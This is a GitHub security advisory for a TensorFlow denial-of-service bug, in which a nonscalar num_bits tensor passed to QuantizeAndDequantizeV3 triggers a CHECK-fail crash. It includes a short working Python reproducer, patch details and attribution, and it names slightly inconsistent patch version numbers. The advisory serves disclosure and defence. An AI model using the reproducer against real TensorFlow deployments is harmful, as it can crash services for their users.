… QuantizeAndDequantizeV3.

QuantizeAndDequantizeV3Op, which accepts `num_bits` as a tensor, has a precondition that it should be rank <= 1 and the number of elements should be 1.
This change adds a validation for the Compute() method for this condition.

# `CHECK` fail in `QuantizeAndDequantizeV3`

Low

[pak-laura](/pak-laura)
published
GHSA-9cr2-8pwr-fhfq
Sep 15, 2022

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.10.0

## Patched versions

2.7.4, 2.8.3, 2.9.2, 2.10.0

## Description

### Impact

If `QuantizeAndDequantizeV3` is given a nonscalar `num_bits` input tensor, it results in a `CHECK` fail that can be used to trigger a denial of service attack.

```
import tensorflow as tf

signed_input = True
range_given = False
narrow_range = False
axis = -1
input = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)
num_bits = tf.constant([], shape=[0], dtype=tf.int32)
tf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)
```
### Patches

We have patched the issue in GitHub commit [f3f9cb38ecfe5a8a703f2c4a8fead434ef291713](https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

### CVE ID
